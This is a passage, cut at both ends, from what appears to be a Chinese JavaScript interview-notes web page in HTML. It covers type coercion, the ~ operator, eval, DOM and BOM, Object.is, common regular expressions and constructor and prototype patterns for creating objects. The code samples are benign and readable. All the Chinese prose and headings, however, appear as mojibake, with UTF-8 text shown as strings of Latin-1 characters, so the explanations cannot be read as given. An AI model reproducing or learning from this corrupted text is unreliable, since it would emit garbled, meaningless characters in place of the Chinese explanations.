valueOf ç»“æœä¸º {} ï¼ŒtoString çš„ç»“æœä¸º â€œ[object Object]â€</p><p>[] çš„ valueOf ç»“æœä¸º [] ï¼ŒtoString çš„ç»“æœä¸º â€œâ€</p><h2 id="æ“ä½œç¬¦çš„ä½œç”¨ï¼Ÿ"><a href="#æ“ä½œç¬¦çš„ä½œç”¨ï¼Ÿ" class="headerlink" title="~ æ“ä½œç¬¦çš„ä½œç”¨ï¼Ÿ"></a>~ æ“ä½œç¬¦çš„ä½œç”¨ï¼Ÿ</h2><p>åè½¬è¢«æ“ä½œæ•°çš„ä½ï¼š~ è¿”å› 2 çš„è¡¥ç ï¼Œå¹¶ä¸” ~ ä¼šå°†æ•°å­—è½¬æ¢ä¸º 32 ä½æ•´æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ~ æ¥è¿›è¡Œå–æ•´æ“ä½œã€‚~x å¤§è‡´ç­‰åŒäº -(x+1)ã€‚</p><h2 id="eval-æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ"><a href="#eval-æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ" class="headerlink" title="eval æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ"></a>eval æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ</h2><p>å®ƒçš„åŠŸèƒ½æ˜¯æŠŠå¯¹åº”çš„å­—ç¬¦ä¸²è§£ææˆ JS ä»£ç å¹¶è¿è¡Œã€‚</p><p>åº”è¯¥é¿å…ä½¿ç”¨ evalï¼Œä¸å®‰å…¨ï¼Œéå¸¸è€—æ€§èƒ½ï¼ˆ2æ¬¡ï¼Œä¸€æ¬¡è§£ææˆ js è¯­å¥ï¼Œä¸€æ¬¡æ‰§è¡Œï¼‰ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-DOM-å’Œ-BOMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-DOM-å’Œ-BOMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ DOM å’Œ BOMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ DOM å’Œ BOMï¼Ÿ</h2><p>DOM æŒ‡çš„æ˜¯<strong>æ–‡æ¡£å¯¹è±¡æ¨¡å‹</strong>ï¼Œå®ƒæŒ‡çš„æ˜¯æŠŠæ–‡æ¡£å½“åšä¸€ä¸ªå¯¹è±¡æ¥å¯¹å¾…ï¼Œè¿™ä¸ªå¯¹è±¡ä¸»è¦å®šä¹‰äº†å¤„ç†ç½‘é¡µå†…å®¹çš„æ–¹æ³•å’Œæ¥å£ã€‚</p><p>BOM æŒ‡çš„æ˜¯<strong>æµè§ˆå™¨å¯¹è±¡æ¨¡å‹</strong>ï¼Œå®ƒæŒ‡çš„æ˜¯æŠŠæµè§ˆå™¨å½“åšä¸€ä¸ªå¯¹è±¡æ¥å¯¹å¾…ï¼Œè¿™ä¸ªå¯¹è±¡ä¸»è¦å®šä¹‰äº†ä¸æµè§ˆå™¨è¿›è¡Œäº¤äº’çš„æ³•å’Œæ¥å£ã€‚BOMçš„æ ¸å¿ƒæ˜¯ windowï¼Œè€Œ window å¯¹è±¡å…·æœ‰åŒé‡è§’è‰²ï¼Œå®ƒæ—¢æ˜¯é€šè¿‡ js è®¿é—®æµè§ˆå™¨çª—å£çš„ä¸€ä¸ªæ¥å£ï¼Œåˆæ˜¯ä¸€ä¸ª Globalï¼ˆå…¨å±€ï¼‰å¯¹è±¡ã€‚è¿™æ„å‘³ç€<strong>åœ¨ç½‘é¡µä¸­å®šä¹‰çš„ä»»ä½•å¯¹è±¡ï¼Œå˜é‡å’Œå‡½æ•°ï¼Œéƒ½ä½œä¸ºå…¨å±€å¯¹è±¡çš„ä¸€ä¸ªå±æ€§æˆ–è€…æ–¹æ³•å­˜åœ¨</strong>ã€‚window å¯¹è±¡å«æœ‰ location å¯¹è±¡ã€navigator å¯¹è±¡ã€screen å¯¹è±¡ç­‰å­å¯¹è±¡ï¼Œå¹¶ä¸” DOM æœ€æ ¹æœ¬çš„ document å¯¹è±¡ä¹Ÿæ˜¯ window çš„å­å¯¹è±¡ã€‚</p><h2 id="è§£æå­—ç¬¦ä¸²ä¸­çš„æ•°å­—å’Œå°†å­—ç¬¦ä¸²å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ•°å­—ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è§£æå­—ç¬¦ä¸²ä¸­çš„æ•°å­—å’Œå°†å­—ç¬¦ä¸²å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ•°å­—ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è§£æå­—ç¬¦ä¸²ä¸­çš„æ•°å­—å’Œå°†å­—ç¬¦ä¸²å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ•°å­—ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>è§£æå­—ç¬¦ä¸²ä¸­çš„æ•°å­—å’Œå°†å­—ç¬¦ä¸²å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ•°å­—ä¹‹é—´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><ul><li>â‘  å…è®¸å­—ç¬¦ä¸²ï¼ˆå¦‚ parseInt() ï¼‰ä¸­å«æœ‰éæ•°å­—å­—ç¬¦ï¼Œè§£ææŒ‰ä»å·¦åˆ°å³çš„é¡ºåºï¼Œå¦‚æœé‡åˆ°éæ•°å­—å­—ç¬¦å°±<strong>åœæ­¢</strong>ã€‚</li><li>â‘¡ï¼ˆå¦‚ Number ()ï¼‰ä¸å…è®¸å‡ºç°éæ•°å­—å­—ç¬¦ï¼Œå¦åˆ™ä¼š<strong>å¤±è´¥</strong>å¹¶è¿”å› NaNã€‚</li></ul><h2 id="å¸ƒå°”å€¼çš„éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Ÿ"><a href="#å¸ƒå°”å€¼çš„éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Ÿ" class="headerlink" title="å¸ƒå°”å€¼çš„éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Ÿ"></a>å¸ƒå°”å€¼çš„éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰ if (..) è¯­å¥ä¸­çš„æ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ã€‚<br>ï¼ˆ2ï¼‰ for ( .. ; .. ; .. ) è¯­å¥ä¸­çš„æ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ï¼ˆç¬¬äºŒä¸ªï¼‰ã€‚<br>ï¼ˆ3ï¼‰ while (..) å’Œ do..while(..) å¾ªç¯ä¸­çš„æ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ã€‚<br>ï¼ˆ4ï¼‰ ? : ä¸­çš„æ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ã€‚<br>ï¼ˆ5ï¼‰ é€»è¾‘è¿ç®—ç¬¦ ||ï¼ˆé€»è¾‘æˆ–ï¼‰å’Œ &amp;&amp;ï¼ˆé€»è¾‘ä¸ï¼‰å·¦è¾¹çš„æ“ä½œæ•°ï¼ˆä½œä¸ºæ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ï¼‰ã€‚</p><h2 id="å’Œ-amp-amp-æ“ä½œç¬¦çš„è¿”å›å€¼ï¼Ÿ"><a href="#å’Œ-amp-amp-æ“ä½œç¬¦çš„è¿”å›å€¼ï¼Ÿ" class="headerlink" title="|| å’Œ &amp;&amp; æ“ä½œç¬¦çš„è¿”å›å€¼ï¼Ÿ"></a>|| å’Œ &amp;&amp; æ“ä½œç¬¦çš„è¿”å›å€¼ï¼Ÿ</h2><p>|| å’Œ &amp;&amp; é¦–å…ˆä¼šå¯¹ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ‰§è¡Œæ¡ä»¶åˆ¤æ–­ï¼Œå¦‚æœå…¶ä¸æ˜¯å¸ƒå°”å€¼å°±å…ˆè¿›è¡Œ ToBoolean å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œç„¶åå†æ‰§è¡Œæ¡ä»¶åˆ¤æ–­ã€‚</p><p>å¯¹äº || æ¥è¯´ï¼Œå¦‚æœæ¡ä»¶åˆ¤æ–­ç»“æœä¸º true å°±è¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœä¸º false å°±è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°çš„å€¼ã€‚</p><p>&amp;&amp; åˆ™ç›¸åï¼Œå¦‚æœæ¡ä»¶åˆ¤æ–­ç»“æœä¸º true å°±è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœä¸º false å°±è¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å€¼ã€‚</p><p>|| å’Œ &amp;&amp; è¿”å›å®ƒä»¬å…¶ä¸­ä¸€ä¸ª<strong>æ“ä½œæ•°çš„å€¼</strong>ï¼Œè€Œéæ¡ä»¶åˆ¤æ–­çš„ç»“æœã€‚</p><h2 id="æ“ä½œç¬¦çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è§„åˆ™ï¼Ÿ"><a href="#æ“ä½œç¬¦çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è§„åˆ™ï¼Ÿ" class="headerlink" title="== æ“ä½œç¬¦çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è§„åˆ™ï¼Ÿ"></a>== æ“ä½œç¬¦çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è§„åˆ™ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å­—ç¬¦ä¸²å’Œæ•°å­—ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ï¼ˆ2ï¼‰å…¶ä»–ç±»å‹å’Œå¸ƒå°”ç±»å‹ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒï¼Œå…ˆå°†å¸ƒå°”å€¼è½¬æ¢ä¸ºæ•°å­—åï¼Œå†åº”ç”¨å…¶ä»–è§„åˆ™è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ï¼ˆ3ï¼‰null å’Œ undefined æ¯”è¾ƒï¼Œç»“æœä¸ºçœŸã€‚å…¶ä»–å€¼å’Œå®ƒä»¬è¿›è¡Œæ¯”è¾ƒéƒ½è¿”å›å‡å€¼ã€‚</p><p>ï¼ˆ4ï¼‰å¯¹è±¡å’Œéå¯¹è±¡ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒï¼Œå¯¹è±¡å…ˆè°ƒç”¨ ToPrimitive æŠ½è±¡æ“ä½œåï¼Œå†è¿›è¡Œæ¯”è¾ƒã€‚</p><p>ï¼ˆ5ï¼‰å¦‚æœä¸€ä¸ªæ“ä½œå€¼ä¸º NaN ï¼Œåˆ™ç›¸ç­‰æ¯”è¾ƒè¿”å› false ã€‚</p><p>ï¼ˆ6ï¼‰å¦‚æœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™æ¯”è¾ƒå®ƒä»¬æ˜¯ä¸æ˜¯æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™ç›¸ç­‰æ“ä½œç¬¦è¿”å› trueï¼Œå¦åˆ™ï¼Œè¿”å› falseã€‚</p><h2 id="Object-is-ä¸æ¯”è¾ƒæ“ä½œç¬¦-â€œ-â€ã€â€œ-â€-çš„åŒºåˆ«ï¼Ÿ"><a href="#Object-is-ä¸æ¯”è¾ƒæ“ä½œç¬¦-â€œ-â€ã€â€œ-â€-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="Object.is() ä¸æ¯”è¾ƒæ“ä½œç¬¦ â€œ===â€ã€â€œ==â€ çš„åŒºåˆ«ï¼Ÿ"></a>Object.is() ä¸æ¯”è¾ƒæ“ä½œç¬¦ â€œ===â€ã€â€œ==â€ çš„åŒºåˆ«ï¼Ÿ</h2><p>ä¸¤ç­‰å·åˆ¤ç­‰ï¼Œä¼šåœ¨æ¯”è¾ƒæ—¶è¿›è¡Œç±»å‹è½¬æ¢ã€‚</p><p>ä¸‰ç­‰å·åˆ¤ç­‰ï¼ˆåˆ¤æ–­ä¸¥æ ¼ï¼‰ï¼Œæ¯”è¾ƒæ—¶ä¸è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚</p><p>Object.is åœ¨ä¸‰ç­‰å·åˆ¤ç­‰çš„åŸºç¡€ä¸Šç‰¹åˆ«å¤„ç†äº† NaN ã€-0 å’Œ +0 ã€‚ Object.is(NaN, NaN) è¿”å› trueï¼ŒObject.is(-0ï¼Œ+0)è¿”å› false ã€‚</p><p>Object.is åº”è¢«è®¤ä¸ºæœ‰å…¶ç‰¹æ®Šçš„ç”¨é€”ï¼Œè€Œä¸èƒ½ç”¨å®ƒè®¤ä¸ºå®ƒæ¯”å…¶å®ƒçš„ç›¸ç­‰å¯¹æ¯”æ›´å®½æ¾æˆ–ä¸¥æ ¼ã€‚</p><h3 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h3><ol><li><p>å…ˆåˆ¤æ–­æ˜¯å¦åœ¨å¯¹æ¯” <code>null</code> å’Œ <code>undefined</code>ï¼Œæ˜¯çš„è¯å°±ä¼šè¿”å› <code>true</code></p></li><li><p>åˆ¤æ–­ä¸¤è€…ç±»å‹æ˜¯å¦ä¸º <code>string</code> å’Œ <code>number</code>ï¼Œæ˜¯çš„è¯å°±ä¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸º <code>number</code></p></li><li><p>åˆ¤æ–­å…¶ä¸­ä¸€æ–¹æ˜¯å¦ä¸º <code>boolean</code>ï¼Œæ˜¯çš„è¯å°±ä¼šæŠŠ <code>boolean</code> è½¬ä¸º <code>number</code> å†è¿›è¡Œåˆ¤æ–­</p></li><li><p>åˆ¤æ–­å…¶ä¸­ä¸€æ–¹æ˜¯å¦ä¸º <code>object</code> ä¸”å¦ä¸€æ–¹ä¸º <code>string</code>ã€<code>number</code> æˆ–è€… <code>symbol</code>ï¼Œæ˜¯çš„è¯å°±ä¼šæŠŠ <code>object</code> è½¬ä¸ºåŸå§‹ç±»å‹å†è¿›è¡Œåˆ¤æ–­</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;</span> == &#123; <span class="attr">name</span>: <span class="string">&#x27;yck&#x27;</span> &#125;</span><br><span class="line">        â†“</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> == <span class="string">&#x27;[object Object]&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="å¦‚ä½•å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œä¾‹å¦‚-â€˜12-3bâ€™"><a href="#å¦‚ä½•å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œä¾‹å¦‚-â€˜12-3bâ€™" class="headerlink" title="å¦‚ä½•å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œä¾‹å¦‚ â€˜12.3bâ€™?"></a>å¦‚ä½•å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œä¾‹å¦‚ â€˜12.3bâ€™?</h2><p>ï¼ˆ1ï¼‰ä½¿ç”¨ Number() æ–¹æ³•ï¼Œå‰ææ˜¯æ‰€åŒ…å«çš„å­—ç¬¦ä¸²ä¸åŒ…å«ä¸åˆæ³•å­—ç¬¦ã€‚</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨ parseInt() æ–¹æ³•ï¼ŒparseInt() å‡½æ•°å¯è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚è¿˜å¯ä»¥è®¾ç½®è¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚å½“åŸºæ•°çš„å€¼ä¸º 0ï¼Œæˆ–æ²¡æœ‰è®¾ç½®è¯¥å‚æ•°æ—¶ï¼ŒparseInt() ä¼šæ ¹æ® string æ¥åˆ¤æ–­æ•°å­—çš„åŸºæ•°ã€‚</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨ parseFloat() æ–¹æ³•ï¼Œè¯¥å‡½æ•°è§£æä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°å¹¶è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚</p><p>ï¼ˆ4ï¼‰ä½¿ç”¨ + æ“ä½œç¬¦çš„éšå¼è½¬æ¢ï¼Œå‰ææ˜¯æ‰€åŒ…å«çš„å­—ç¬¦ä¸²ä¸åŒ…å«ä¸åˆæ³•å­—ç¬¦ã€‚</p><h2 id="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ï¼ˆ1ï¼‰åŒ¹é… 16 è¿›åˆ¶é¢œè‰²å€¼</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/#([0-9a-fA-F]&#123;6&#125;|[0-9a-fA-F]&#123;3&#125;)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ2ï¼‰åŒ¹é…æ—¥æœŸï¼Œå¦‚ yyyy-mm-dd æ ¼å¼</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ3ï¼‰åŒ¹é… qq å·</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[1-9][0-9]&#123;4,10&#125;$/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ4ï¼‰æ‰‹æœºå·ç æ­£åˆ™</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^1[34578]\d&#123;9&#125;$/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ5ï¼‰ç”¨æˆ·åæ­£åˆ™</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[a-zA-Z\$][a-zA-Z0-9_\$]&#123;4,16&#125;$/</span>;</span><br></pre></td></tr></table></figure><h2 id="javascript-åˆ›å»ºå¯¹è±¡çš„å‡ ç§æ–¹å¼ï¼Ÿ"><a href="#javascript-åˆ›å»ºå¯¹è±¡çš„å‡ ç§æ–¹å¼ï¼Ÿ" class="headerlink" title="javascript åˆ›å»ºå¯¹è±¡çš„å‡ ç§æ–¹å¼ï¼Ÿ"></a>javascript åˆ›å»ºå¯¹è±¡çš„å‡ ç§æ–¹å¼ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å·¥å‚æ¨¡å¼ã€‚ä¸»è¦å·¥ä½œåŸç†æ˜¯ç”¨å‡½æ•°æ¥å°è£…åˆ›å»ºå¯¹è±¡çš„ç»†èŠ‚ï¼Œä»è€Œé€šè¿‡è°ƒç”¨å‡½æ•°æ¥è¾¾åˆ°å¤ç”¨çš„ç›®çš„ã€‚<strong>ç¼ºç‚¹</strong>æ˜¯å¯¹è±¡æ— æ³•è¯†åˆ«ï¼Œå› ä¸ºæ‰€æœ‰çš„å®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªåŸå‹ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = createPerson(<span class="string">&#x27;kevin&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ„é€ å‡½æ•°æ¨¡å¼ã€‚js ä¸­æ¯ä¸€ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°ï¼Œåªè¦ä¸€ä¸ªå‡½æ•°æ˜¯é€šè¿‡ new æ¥è°ƒç”¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠå®ƒç§°ä¸ºæ„é€ å‡½æ•°ã€‚æ‰§è¡Œæ„é€ å‡½æ•°é¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå°†å¯¹è±¡çš„åŸå‹æŒ‡å‘æ„é€ å‡½æ•°çš„ prototype å±æ€§ï¼Œç„¶åå°†æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„ this æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œæœ€åå†æ‰§è¡Œæ•´ä¸ªå‡½æ•°ï¼Œå¦‚æœè¿”å›å€¼ä¸æ˜¯å¯¹è±¡ï¼Œåˆ™è¿”å›æ–°å»ºçš„å¯¹è±¡ã€‚å› ä¸º this çš„å€¼æŒ‡å‘äº†æ–°å»ºçš„å¯¹è±¡ï¼Œå› æ­¤ä½¿ç”¨ this ç»™å¯¹è±¡èµ‹å€¼ã€‚<strong>ä¼˜ç‚¹</strong>æ˜¯å®ä¾‹å¯ä»¥è¯†åˆ«ä¸ºä¸€ä¸ªç‰¹å®šçš„ç±»å‹ã€‚<strong>ç¼ºç‚¹</strong>æ˜¯æ¯æ¬¡åˆ›å»ºå®ä¾‹æ—¶ï¼Œæ¯ä¸ªæ–¹æ³•éƒ½è¦è¢«åˆ›å»ºä¸€æ¬¡ï¼Œå¯¹å‡½æ•°å¯¹è±¡çš„åˆ›å»ºä¼šæµªè´¹ä¸å¿…è¦çš„å†…å­˜ç©ºé—´ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">&#x27;kevin&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰åŸå‹æ¨¡å¼ã€‚æ¯ä¸€ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼ŒåŒ…å«äº†é€šè¿‡æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å®ä¾‹éƒ½èƒ½å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨åŸå‹å¯¹è±¡æ¥æ·»åŠ å…¬ç”¨å±æ€§å’Œæ–¹æ³•ï¼Œä»è€Œå®ç°ä»£ç çš„å¤ç”¨ã€‚<strong>ä¼˜ç‚¹</strong>æ˜¯æ–¹æ³•ä¸ä¼šé‡æ–°åˆ›å»ºã€‚<strong>ç¼ºç‚¹</strong>æ˜¯ 1. æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•éƒ½å…±äº«ã€‚ 2. ä¸èƒ½åˆå§‹åŒ–å‚æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = <span class="string">&#x27;keivn&#x27;</span>;</span><br><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸå‹æ¨¡å¼ä¼˜åŒ–</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    <span class="comment">// å®ä¾‹å¯ä»¥é€šè¿‡constructorå±æ€§æ‰¾åˆ°æ‰€å±æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="attr">constructor</span>: Person,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;kevin&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¼˜ç‚¹ï¼šå°è£…æ€§å¥½äº†ä¸€ç‚¹</span></span><br><span class="line"><span class="comment">// ç¼ºç‚¹ï¼šåŸå‹æ¨¡å¼è¯¥æœ‰çš„ç¼ºç‚¹è¿˜æ˜¯æœ‰</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ç»„åˆä½¿ç”¨æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼ã€‚è¿™æ˜¯åˆ›å»ºè‡ªå®šä¹‰ç±»å‹çš„æœ€å¸¸è§æ–¹å¼ï¼Œé€šè¿‡æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ï¼Œé€šè¿‡åŸå‹å¯¹è±¡æ¥å®ç°å‡½æ•°æ–¹æ³•çš„å¤ç”¨ã€‚<strong>ç¼ºç‚¹</strong>æ˜¯å¯¹äºä»£ç çš„å°è£…æ€§ä¸å¤Ÿå¥½ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    <span class="attr">constructor</span>: Person,</span><br><span class="line">    <span class="attr">getName</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰åŠ¨æ€åŸå‹æ¨¡å¼ã€‚å°†åŸå‹æ–¹æ³•èµ‹å€¼çš„åˆ›å»ºè¿‡ç¨‹ç§»åŠ¨åˆ°äº†æ„é€ å‡½æ•°çš„å†…éƒ¨ï¼Œé€šè¿‡å¯¹å±æ€§æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ï¼Œå¯ä»¥å®ç°ä»…åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶å¯¹åŸå‹å¯¹è±¡èµ‹å€¼ä¸€æ¬¡çš„æ•ˆæœã€‚<strong>ä¼˜ç‚¹</strong>æ˜¯å¾ˆå¥½åœ°å¯¹ä¸Šé¢çš„æ··åˆæ¨¡å¼è¿›è¡Œäº†å°è£…ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span>.getName != <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><p>ï¼ˆ6ï¼‰å¯„ç”Ÿæ„é€ å‡½æ•°æ¨¡å¼ã€‚å¯„ç”Ÿæ„é€ 